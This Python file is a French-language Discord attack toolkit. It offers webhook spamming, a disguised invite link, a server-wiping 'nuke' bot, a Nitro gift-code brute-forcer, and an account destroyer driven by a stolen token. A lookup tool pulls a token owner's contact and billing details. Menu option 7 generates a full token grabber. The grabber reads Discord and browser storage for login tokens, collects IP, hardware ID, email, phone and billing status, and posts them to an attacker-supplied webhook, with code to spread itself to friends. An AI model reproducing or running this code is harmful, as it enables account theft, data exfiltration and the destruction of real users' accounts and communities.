from asyncore import loop
from email import message
import os
import socket  
from pickle import TRUE

from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv
from pystyle import *
from os import system

hostname = socket.gethostname()    
IPAddr = socket.gethostbyname(hostname) 
local_ip = socket.gethostbyname(socket.gethostname())




name = """
 ▄████▄   ▒█████   ██▀███  ▓█████▄▓██   ██▓ ▄████▄  ▓█████  ██▓███    ██████ 
▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▀ ██▌▒██  ██▒▒██▀ ▀█  ▓█   ▀ ▓██░  ██▒▒██    ▒ 
▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒░██   █▌ ▒██ ██░▒▓█    ▄ ▒███   ▓██░ ██▓▒░ ▓██▄   
▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ░▓█▄   ▌ ░ ▐██▓░▒▓▓▄ ▄██▒▒▓█  ▄ ▒██▄█▓▒ ▒  ▒   ██▒
▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░▒████▓  ░ ██▒▓░▒ ▓███▀ ░░▒████▒▒██▒ ░  ░▒██████▒▒
░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒▓  ▒   ██▒▒▒ ░ ░▒ ▒  ░░░ ▒░ ░▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░
  ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░ ░ ▒  ▒ ▓██ ░▒░   ░  ▒    ░ ░  ░░▒ ░     ░ ░▒  ░ ░
░        ░ ░ ░ ▒    ░░   ░  ░ ░  ░ ▒ ▒ ░░  ░           ░   ░░       ░  ░  ░  
░ ░          ░ ░     ░        ░    ░ ░     ░ ░         ░  ░               ░  
░                           ░      ░ ░     ░  
  """
tet = """
╔══════════════════════════════╦══════════════════════════╦══════════════════════╦
║                              ║                          ║                      ║
║     [01] SPAM WEBHOOK        ║     [08] TOKEN NUKE      ║     [23] CREDITS     ║
║     [02] URL SERV DISCORD    ║     [09] TOKEN INFO      ║                      ║
║     [03] STATUE DISCORD      ║     [10] SOON            ║                      ║
║     [04] MY IP V4            ║     [11] SOON            ║                      ║
║     [05] SERVER NUKE         ║     [13] SOON            ║                      ║
║     [06] GEN NITO            ║     [14] SOON            ║                      ║
║     [07] GEN TOKEN GRABB     ║     [15] SOON            ║                      ║
║                              ║                          ║                      ║
╚══════════════════════════════╩══════════════════════════╩══════════════════════╩

                        officiel discord : https://discord.gg/HES2DDAQ

cordy : """

Anime.Fade(Center.Center(name), Colors.yellow_to_red, Colorate.Vertical, interval=0.025, enter=True)

print(Colorate.Horizontal(Colors.yellow_to_red, Center.XCenter(name)))

mode = input(Colorate.Horizontal(Colors.yellow_to_red, Center.XCenter(tet)))

system("cls")

if mode == "":
    print(Colorate.Horizontal(Colors.yellow_to_red, Center.XCenter(name)))

    mode = input(Colorate.Horizontal(Colors.yellow_to_red, Center.XCenter(tet)))






if mode == "1":
    from dhooks import Webhook
    webhook_url = Write.Input("url du webhook -> ", Colors.yellow_to_red, interval=0.008)
    msg = Write.Input("quelle est votre message a envoyer -> ", Colors.yellow_to_red, interval=0.008)



    while True:
        hook = Webhook(webhook_url)
        hook.send(msg)
        print("message envoyer avec succes !!")

if mode == "2":
    import clipboard
    print("""
    ██╗███╗   ██╗██╗   ██╗██╗████████╗███████╗
    ██║████╗  ██║██║   ██║██║╚══██╔══╝██╔════╝
    ██║██╔██╗ ██║██║   ██║██║   ██║   █████╗  
    ██║██║╚██╗██║╚██╗ ██╔╝██║   ██║   ██╔══╝  
    ██║██║ ╚████║ ╚████╔╝ ██║   ██║   ███████╗
    ╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝   ╚═╝   ╚══════╝ 
    """)
    server = input("Server invite:\n")
    invite = input("new invite name:\n")
    gay = "discοrd.gg/" + invite + "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||" + server
    clipboard.copy(gay)
    print('Copyed to clipboard!')
    input()


if mode =="3":
    import discord
    from discord.ext import commands

    token = input ("entrée votre token > ")

    bot = commands.Bot(command_prefix = "123456789")

    print('What would you like to stream?')
    status = input(' > ')

    @bot.event
    async def on_connect():
        stream = discord.Streaming(
            name = status,
            url = 'https://www.twitch.tv/choco'
        )
        print('Streaming: ' + status)
        await bot.change_presence(activity=stream)

    bot.run(token, bot=False) 



if mode =="4": 
    hostname = socket.gethostname()    
    IPAddr = socket.gethostbyname(hostname) 
    local_ip = socket.gethostbyname(socket.gethostname())
    host_name = socket.gethostname()    
    IPAddress = socket.gethostbyname(host_name)    
    print("[+] Le nom de ton Ordinateur est :" + host_name)    
    print(f"[+] Ton Local IP est : {local_ip}")

if mode == "5":
    import discord
    from discord.ext import commands, tasks
    import os
    import asyncio

    token = input ("entrée le token du bot : ")
    prefix= input("entrée le prefix du bot : ")
    invites = input("entrée le lien d'invitation a spam avec la commande "+ prefix+"invite : ")
    nom = input("entrée le nouveau nom du server : ")
    nomC = input ("entrée le nom des channels crée : ")
    message2 = input ("entrée le message a spam : ")
    n=0

    intents=discord.Intents.default()
    intents = discord.Intents(messages=True, guilds=True)




    client = commands.Bot(command_prefix=prefix, intents=intents)
    @client.event
    async def on_ready():
        print('Bot is online')
        print("commandes : \n ping \n invite \n nuke \n spam")
        await client.change_presence(activity=discord.Game('Security'))

    @client.command()
    async def ping(ctx):
        await ctx.send(f'Pong! {round(client.latency * 1000)}ms')

    @client.command()
    async def invite(ctx):
      await ctx.reply(invites) 

    @client.command()
    async def nuke(ctx):

        await ctx.guild.edit(name=nom) 

        for c in ctx.guild.channels:
            await c.delete()

        guild = ctx.message.guild

        n=0
        while(n<=60):
            await guild.create_text_channel(nomC) 
            n = n+1

        for c in ctx.guild.text_channels:
                 await c.send(message2)
                 await c.send(message2)
                 await c.send(message2)
                 await c.send(message2)
                 await c.send(message2)

    @client.command()
    async def spam(ctx):
        for c in ctx.guild.text_channels:
                 await c.send(message2 ) 
                 await c.send(message2 )
                 await c.send(message2 )
                 await c.send(message2 )
                 await c.send(message2 )

    client.run(token) 
    

if mode == "6":
    import colorama
    from colorama import Fore
    from selenium import webdriver
    from discord.ext import commands
    import discord
    import random, json
    import requests
    import string, pyautogui
    import ctypes, os, sys
    import webbrowser, base64
    import time, threading
    from os import system
    threaad = int(input("Combient de nitro a gen ?: "))
    sendto = str(input("vous voulez envoyer les code nitro valid a un webhook ? [yes,no] : ")).lower()


    def nitrotofile(threaad):
        def nitro():
            system("cls")
            while True:
                nitrochars = string.ascii_letters + string.digits
                code = "".join(random.choice(nitrochars)for x in range(16))
                nitrocode = "https://discord.gift/" + code
                r = requests.get('https://discord.com/api/v9/entitlements/gift-codes/{}'.format(code))
                if r.status_code == 200:
                    print("\033[32m[+] Valid ~ {}".format(nitrocode))
                    file = open("ValidNitro.txt",'a')
                    file.write(nitrocode + '\n')
                else:
                    print("\033[31m[-] Invalid ~ {}".format(nitrocode))

        threads = []

        for _ in range(threaad):
            t = threading.Thread(target=nitro)
            t.start()
            threads.append(t)

        for thread in threads:
            thread.join()

    def nitrotohook(threaad):
        webhook = input("What is the webhook do you want the valid nitro code to be sent to?: ")
        def nitro():
            system("cls")
            while True:
                nitrochars = string.ascii_letters + string.digits
                code = "".join(random.choice(nitrochars)for x in range(16))
                nitrocode = "https://discord.gift/" + code
                r = requests.get('https://discord.com/api/v9/entitlements/gift-codes/{}'.format(code))
                if r.status_code == 200:
                    print("\033[32m[+] Valid ~ {}".format(nitrocode))
                    payload = {
                        'content':nitrocode
                    }
                    requests.post(webhook,json=payload)
                else:
                    print("\033[31m[-] Invalid ~ {}".format(nitrocode))

        threads = []

        for _ in range(threaad):
            t = threading.Thread(target=nitro)
            t.start()
            threads.append(t)

        for thread in threads:
            thread.join()

    if sendto =="yes":
        nitrotohook(threaad)
    elif sendto == "no":
        nitrotofile(threaad)
    else:
        print('Invalid Option.')

if mode == "7":
        lien = input("entrée le webhook ou vous recevrez les info du token grabbeur : ")
        token_grabber = r"""import os
    if os.name != "nt":
        exit()
    from re import findall
    from json import loads, dumps
    from base64 import b64decode
    from subprocess import Popen, PIPE
    from urllib.request import Request, urlopen
    from datetime import datetime
    from threading import Thread
    from time import sleep
    from sys import argv
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    PATHS = {
        "Discord"           : ROAMING + "\\Discord",
        "Discord Canary"    : ROAMING + "\\discordcanary",
        "Discord PTB"       : ROAMING + "\\discordptb",
        "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
        "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
        "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
    }
    def getheaders(token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers
    def getuserdata(token):
        try:
            return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
        except:
            pass
    def gettokens(path):
        path += "\\Local Storage\\leveldb"
        tokens = []
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for token in findall(regex, line):
                        tokens.append(token)
        return tokens
    def getdeveloper():
        dev = "wodx"
        try:
            dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
        except:
            pass
        return dev
    def getip():
        ip = "None"
        try:
            ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        except:
            pass
        return ip
    def getavatar(uid, aid):
        url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
        try:
            urlopen(Request(url))
        except:
            url = url[:-4]
        return url
    def gethwid():
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
    def getfriends(token):
        try:
            return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
        except:
            pass
    def getchat(token, uid):
        try:
            return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
        except:
            pass
    def has_payment_methods(token):
        try:
            return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
        except:
            pass
    def send_message(token, chat_id, form_data):
        try:
            urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
        except:
            pass
    def spread(token, form_data, delay):
        return 
        for friend in getfriends(token):
            try:
                chat_id = getchat(token, friend["id"])
                send_message(token, chat_id, form_data)
            except Exception as e:
                pass
            sleep(delay)
    def main():
        cache_path = ROAMING + "\\.cache~$"
        prevent_spam = True
        self_spread = True
        embeds = []
        working = []
        checked = []
        already_cached_tokens = []
        working_ids = []
        ip = getip()
        pc_username = os.getenv("UserName")
        pc_name = os.getenv("COMPUTERNAME")
        user_path_name = os.getenv("userprofile").split("\\")[2]
        developer = getdeveloper()
        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue
            for token in gettokens(path):
                if token in checked:
                    continue
                checked.append(token)
                uid = None
                if not token.startswith("mfa."):
                    try:
                        uid = b64decode(token.split(".")[0].encode()).decode()
                    except:
                        pass
                    if not uid or uid in working_ids:
                        continue
                user_data = getuserdata(token)
                if not user_data:
                    continue
                working_ids.append(uid)
                working.append(token)
                username = user_data["username"] + "#" + str(user_data["discriminator"])
                user_id = user_data["id"]
                avatar_id = user_data["avatar"]
                avatar_url = getavatar(user_id, avatar_id)
                email = user_data.get("email")
                phone = user_data.get("phone")
                nitro = bool(user_data.get("premium_type"))
                billing = bool(has_payment_methods(token))
                embed = {
                    "color": 0x7289da,
                    "fields": [
                        {
                            "name": "**Account Info**",
                            "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                            "inline": True
                        },
                        {
                            "name": "**PC Info**",
                            "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                            "inline": True
                        },
                        {
                            "name": "**Token**",
                            "value": token,
                            "inline": False
                        }
                    ],
                    "author": {
                        "name": f"{username} ({user_id})",
                        "icon_url": avatar_url
                    },
                    "footer": {
                        "text": f"par Choco $ scream"
                    }
                }
                embeds.append(embed)
        with open(cache_path, "a") as file:
            for token in checked:
                if not token in already_cached_tokens:
                    file.write(token + "\n")
        if len(working) == 0:
            working.append('123')
        webhook = {
            "content": "",
            "embeds": embeds,
            "username": "Choco $ scream",
            "avatar_url": "https://cdn.discordapp.com/attachments/919197754696302623/946509160986603581/cordy.png"
        }
        try:
            urlopen(Request('""" + lien + r"""', data=dumps(webhook).encode(), headers=getheaders()))
        except:
            pass
        if self_spread:
            for token in working:
                with open(argv[0], encoding="utf-8") as file:
                    content = file.read()
                payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
                Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
    try:
        main()
    except Exception as e:
        print(e)
        pass

        """


        with open('token_grabber.pyw', 'w') as f:
            f.write(token_grabber)
        print("Token Grabber créé (;")
        input()
        quit()

if mode == "8":
    import os, sys, time, requests, os.path, base64, json, threading, string, random, discord, asyncio, httpx, pyautogui, re, http.client, subprocess, shutil
    from itertools import cycle
    from colorama import Fore

    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""+ Enter account token you want to nuke""")
    global usertoken
    usertoken = str(input(f"""# Token: """))

    def accnuke():

        def nuke(usertoken, Server_Name, message_Content):
            if threading.active_count() <= 100:
                t = threading.Thread(target=CustomSeizure, args=(usertoken, ))
                t.start()

            headers = {'Authorization': usertoken}
            channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers={'Authorization': usertoken}).json()
            print(f"\n+ Sent a Message to all available friends")
            for channel in channelIds:
                try:
                    requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages', 
                    headers=headers,
                    data={"content": f"{message_Content}"})
                    print(f"\t[{Fore.LIGHTGREEN_EX }! Messaged ID: "+channel['id'])
                except Exception as e:
                    print(f"""\t[{Fore.LIGHTRED_EX }! The following error has been encountered and is being ignored: {e}""")

            print(f"\n+ Left all available guilds")
            guildsIds = requests.get("https://discord.com/api/v7/users/@me/guilds", headers={'Authorization': usertoken}).json()
            for guild in guildsIds:
                try:
                    requests.delete(
                        f'https://discord.com/api/v7/users/@me/guilds/'+guild['id'],
                        headers={'Authorization': usertoken})
                    print(f"\t[{Fore.LIGHTGREEN_EX }! Left guild: "+guild['name'])
                except Exception as e:
                    print(f"""\t[{Fore.LIGHTRED_EX }! The following error has been encountered and is being ignored: {e}""")

            print(f"\n Deleted all available guilds")
            for guild in guildsIds:
                try:
                    requests.delete(f'https://discord.com/api/v7/guilds/'+guild['id'], headers={'Authorization': usertoken})
                    print(f'\t[{Fore.LIGHTGREEN_EX }! Deleted guild: '+guild['name'])
                except Exception as e:
                    print(f"""\t[{Fore.LIGHTRED_EX }! The following error has been encountered and is being ignored: {e}""")

            print(f"\n Removed all available friends")
            friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={'Authorization': usertoken}).json()
            for friend in friendIds:
                try:
                    requests.delete(
                        f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers={'Authorization': usertoken})
                    print(f"\t[{Fore.LIGHTGREEN_EX }! Removed friend: "+friend['user']['username']+"#"+friend['user']['discriminator'])
                except Exception as e:
                    print(f"""\t[{Fore.LIGHTRED_EX }! The following error has been encountered and is being ignored: {e}""")

            print(f"\n Created all servers")
            for i in range(100):
                try:
                    payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': None}
                    requests.post('https://discord.com/api/v7/guilds', headers={'Authorization': usertoken}, json=payload)
                    print(f"\t[{Fore.LIGHTGREEN_EX }! Created {Server_Name} #{i}")
                except Exception as e:
                    print(f"""\t[{Fore.LIGHTRED_EX }! The following error has been encountered and is being ignored: {e}""")
            t.do_run = False
            setting = {
                  'theme': "light",
                  'locale': "ja",
                  'message_display_compact': False,
                  'inline_embed_media': False,
                  'inline_attachment_media': False,
                  'gif_auto_play': False,
                  'render_embeds': False,
                  'render_reactions': False,
                  'animate_emoji': False,
                  'convert_emoticons': False,
                  'enable_tts_command': False,
                  'explicit_content_filter': '0',
                  'status': "idle"
            }
            requests.patch("https://discord.com/api/v7/users/@me/settings", headers={'Authorization': usertoken}, json=setting)
            j = requests.get("https://discordapp.com/api/v9/users/@me", headers={'Authorization': usertoken}).json()
            a = j['username'] + "#" + j['discriminator']
            print(f"\n Succesfully turned {a} into a holl")
            input(f"""\n Press ENTER to exit""")
            main()

        def CustomSeizure(token):
            print(f' Starting seizure mode (Switching on/off Light/dark mode)')
            t = threading.currentThread()
            while getattr(t, "do_run", True):
                modes = cycle(["light", "dark"])
                setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers={'Authorization': usertoken}, json=setting)

        print("Name of the servers that will be created")
        Server_Name = str(input(f' Name: '))
        print(f"\n Message that will be sent to every friend: ")
        message_Content = str(input(f' Message: '))
        r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': usertoken})
        threads = 100

        if threading.active_count() < threads:
            threading.Thread(target=nuke, args=(usertoken, Server_Name, message_Content)).start()
            return

    accnuke()


if mode == "23":
    credit = """
    
   salut flemme de faire le credit pour la beta mais les dev sont Choco8exe#8725 & Scream#1203
    
    """
    print(credit)
    input()


if mode == "9":
    import time
import requests
import json
import sys
import os
import ctypes
from datetime import datetime
from colorama import Fore

def tokeninfo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""[{Fore.LIGHTBLUE_EX }# You can find: \n\n""")
    print(f"""         + Username          + User ID                  + Creation Date            + Avatar URL\n""")
    print(f"""         + Token             + Nitro Status             + Expiration date          + Phone Number\n""")
    print(f"""         + Email             + 2FA/MFA Enabled          + Flags                    + Language\n""")
    print(f"""         + Email Verified    + Payment Method           + Payment Type\n\n\n\n""")
    global token
    print(f"""+ Enter the token on which you want to find information""")
    token = str(input(f"""# Token: """))

    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }

    languages = {
    'da'    : 'Danish, Denmark',
    'de'    : 'German, Germany',
    'en-GB' : 'English, United Kingdom',
    'en-US' : 'English, United States',
    'es-ES' : 'Spanish, Spain',
    'fr'    : 'French, France',
    'hr'    : 'Croatian, Croatia',
    'lt'    : 'Lithuanian, Lithuania',
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
    }

    cc_digits = {
        'american express': '3',
        'visa': '4',
        'mastercard': '5'
    }

    res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)

    if res.status_code == 200:
        res_json = res.json()
        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
        user_id = res_json['id']
        avatar_id = res_json['avatar']
        avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
        phone_number = res_json['phone']
        email = res_json['email']
        mfa_enabled = res_json['mfa_enabled']
        flags = res_json['flags']
        locale = res_json['locale']
        verified = res_json['verified']
        
        language = languages.get(locale)
        creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
        has_nitro = False
        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
        nitro_data = res.json()
        has_nitro = bool(len(nitro_data) > 0)

        if has_nitro:
            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            days_left = abs((d2 - d1).days)
        billing_info = []

        for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():
            yy = x['billing_address']
            name = yy['name']
            address_1 = yy['line_1']
            address_2 = yy['line_2']
            city = yy['city']
            postal_code = yy['postal_code']
            state = yy['state']
            country = yy['country']

            if x['type'] == 1:
                cc_brand = x['brand']
                cc_first = cc_digits.get(cc_brand)
                cc_last = x['last_4']
                cc_month = str(x['expires_month'])
                cc_year = str(x['expires_year'])
                
                data = {
                    'Payment Type': 'Credit Card',
                    'Valid': not x['invalid'],
                    'CC Holder Name': name,
                    'CC Brand': cc_brand.title(),
                    'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                    'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                    'Address 1': address_1,
                    'Address 2': address_2 if address_2 else '',
                    'City': city,
                    'Postal Code': postal_code,
                    'State': state if state else '',
                    'Country': country,
                    'Default Payment Method': x['default']
                }

            elif x['type'] == 2:
                data = {
                    'Payment Type': 'PayPal',
                    'Valid': not x['invalid'],
                    'PayPal Name': name,
                    'PayPal Email': x['email'],
                    'Address 1': address_1,
                    'Address 2': address_2 if address_2 else '',
                    'City': city,
                    'Postal Code': postal_code,
                    'State': state if state else '',
                    'Country': country,
                    'Default Payment Method': x['default']
                }

            billing_info.append(data)

        print(f"""\n# Basic Information:""")
        print(f"""         + Username: {user_name}""")
        print(f"""         + User ID: {user_id}""")
        print(f"""         + Creation Date: {creation_date}""")
        print(f"""         + Avatar URL: {avatar_url if avatar_id else ""}""")
        print(f"""         + Token: {token}\n\n""")
        
        print(f"""# Nitro Information:""")
        print(f"""         + Nitro Status: {has_nitro}""")

        if has_nitro:
            print(f"""         + Expires in: {days_left} day(s)\n\n""")
        else:
            print(f"""         + Expires in: None day(s)\n\n""")

        print(f"""# Contact Information:""")
        print(f"""         + Phone Number: {phone_number if phone_number else ""}""")
        print(f"""          + Email: {email if email else ""}\n\n""")

        if len(billing_info) > 0:
            print(f"""# Billing Information:""")
            if len(billing_info) == 1:
                for x in billing_info:
                    for key, val in x.items():
                        if not val:
                            continue
                        print(Fore.RESET + '    {:<23}{}{}'.format(key, Fore.CYAN, val))

            else:
                for i, x in enumerate(billing_info):
                    title = f'Payment Method #{i + 1} ({x["Payment Type"]})'
                    print('    ' + title)
                    print('    ' + ('=' * len(title)))
                    for j, (key, val) in enumerate(x.items()):
                        if not val or j == 0:
                            continue
                        print(Fore.RESET + '        {:<23}{}{}'.format(key, Fore.CYAN, val))

                    if i < len(billing_info) - 1:
                        print('\n')

            print('\n')

        print(f""" Account Security:""")
        print(f"""           2FA/MFA Enabled: {mfa_enabled}""")
        print(f"""           Flags: {flags}\n\n""")
        print(f""" Other:""")
        print(f"""           Locale: {locale} ({language})""")
        print(f"""           Email Verified: {verified}""")

    elif res.status_code == 401:
        print(f"""          [{Fore.LIGHTRED_EX }# Invalid token""")
        time.sleep(2)
        main()

    else:
        print(f"""          [{Fore.LIGHTRED_EX }# An error occurred while sending request""")
        time.sleep(2)
        main()
    
    input(f"""\n\n Press ENTER to exit""")
    main()

tokeninfo()